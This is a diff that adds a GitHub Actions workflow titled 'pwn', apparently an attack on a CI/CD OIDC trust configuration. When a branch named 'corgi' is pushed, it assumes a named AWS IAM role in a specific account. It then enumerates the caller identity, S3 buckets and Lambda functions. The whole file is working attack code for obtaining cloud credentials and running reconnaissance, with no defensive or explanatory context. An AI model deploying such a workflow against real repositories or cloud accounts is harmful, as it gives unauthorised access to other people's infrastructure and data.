@@ -1,0 +1,26 @@
+name: pwn
+on:
+  push:
+    branches: [corgi]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  assume:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+
+      - name: whoami
+        run: aws sts get-caller-identity
+
+      - name: list buckets
+        run: aws s3 ls
+
+      - name: list lambda functions
+        run: aws lambda list-functions
